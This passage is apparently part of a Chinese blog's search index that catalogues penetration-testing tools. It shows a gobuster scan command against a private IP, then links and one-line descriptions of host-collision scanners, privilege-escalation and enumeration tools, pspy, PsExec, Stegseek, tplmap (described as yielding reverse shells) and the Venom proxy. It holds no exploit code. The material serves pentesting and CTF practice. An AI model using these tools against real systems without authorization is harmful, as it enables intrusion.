class="hljs-deletion">-U &lt;username&gt; - HTTP授权用户名（仅限基本身份验证）。</span><br><span class="hljs-deletion">-to &lt;timeout&gt; - HTTP超时。示例：10s，100ms，1m（默认值：10s）。</span><br></code></pre></td></tr></table></figure><p><strong>示例</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gobuster dir -u https:<span class="hljs-regexp">//</span><span class="hljs-number">10.35</span>.<span class="hljs-number">0.106</span><span class="hljs-regexp">/chatbot/</span> -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/Web-Content/</span>directory-list-<span class="hljs-number">2.3</span>-medium.txt -x php,html,txt -k<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/95b693b083154a2ea25eb079bf35e1ff.png" alt="image-20220319205815092"></p><h3 id="魔术hash"><a href="#魔术hash" class="headerlink" title="魔术hash"></a>魔术hash</h3><p>常用hash文件</p><p><a href="https://github.com/spaze/hashes">hashes</a></p><h3 id="HOST碰撞工具"><a href="#HOST碰撞工具" class="headerlink" title="HOST碰撞工具"></a>HOST碰撞工具</h3><p><strong>介绍</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">很多时候，访问目标网站时，使用其真实<span class="hljs-built_in">IP</span>无法访问，只有域名才能访问到后端业务服务。这是因为反代服务器（如nginx）配置了禁止直接<span class="hljs-built_in">IP</span>访问。<br></code></pre></td></tr></table></figure><p><strong>跨平台自动化Host碰撞扫描工具</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/cckuailong/</span>hostscan<br></code></pre></td></tr></table></figure><p><strong>Python版本</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/fofapro/</span>Hosts_scan<br></code></pre></td></tr></table></figure><h3 id="Linux-Exploit-Suggester-2"><a href="#Linux-Exploit-Suggester-2" class="headerlink" title="Linux Exploit Suggester 2"></a>Linux Exploit Suggester 2</h3><p>功能：提权工具</p><p>项目地址：<a href="https://github.com/jondonas/linux-exploit-suggester-2">GitHub</a></p><h3 id="linux-smart-enumeration"><a href="#linux-smart-enumeration" class="headerlink" title="linux-smart-enumeration"></a>linux-smart-enumeration</h3><p>功能：用于渗透测试和 CTF 的 Linux 枚举工具</p><p>项目地址：<a href="https://github.com/diego-treitos/linux-smart-enumeration.git">GitHub</a></p><h3 id="Magic-hashes"><a href="#Magic-hashes" class="headerlink" title="Magic hashes"></a>Magic hashes</h3><p>功能：魔术hash总结整理</p><p><a href="https://github.com/spaze/hashes">GitHub</a></p><h3 id="PEASS-ng"><a href="#PEASS-ng" class="headerlink" title="PEASS-ng"></a>PEASS-ng</h3><p>功能：提权工具，全版本提权</p><p>项目地址：<a href="https://github.com/carlospolop/PEASS-ng">GitHub</a></p><h3 id="Pspy64s"><a href="#Pspy64s" class="headerlink" title="Pspy64s"></a>Pspy64s</h3><p>linux进程监听工具</p><p><a href="https://github.com/DominicBreuker/pspy/">Github</a></p><h3 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h3><p>功能：PsExec 是一个轻型的 telnet 替代工具，它使您无需手动安装客户端软件即可执行其他系统上的进程，并且可以获得与控制台应用程序相当的完全交互性。</p><h3 id="Stegseek"><a href="#Stegseek" class="headerlink" title="Stegseek"></a>Stegseek</h3><p><a href="https://github.com/RickdeJager/stegseek.git">GitHub</a></p><h3 id="Tqlmap"><a href="#Tqlmap" class="headerlink" title="Tqlmap"></a>Tqlmap</h3><p>功能：SSTI注入工具，拿shell、执行命令、bind_shell、反弹shell、上传下载文件</p><p><a href="https://github.com/epinna/tplmap.git">Github</a></p><h3 id="Venom"><a href="#Venom" class="headerlink" title="Venom"></a>Venom</h3><p>功能：代理转发</p><p>项目地址：<a href="https://github.com/Dliv3/Venom/releases">GitHub</a></p><p><a href="https://www.jianshu.com/p/65e5dc421efd">参考链接</a></p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
      <category>渗透工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透工具</tag>
      
      <tag>Kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
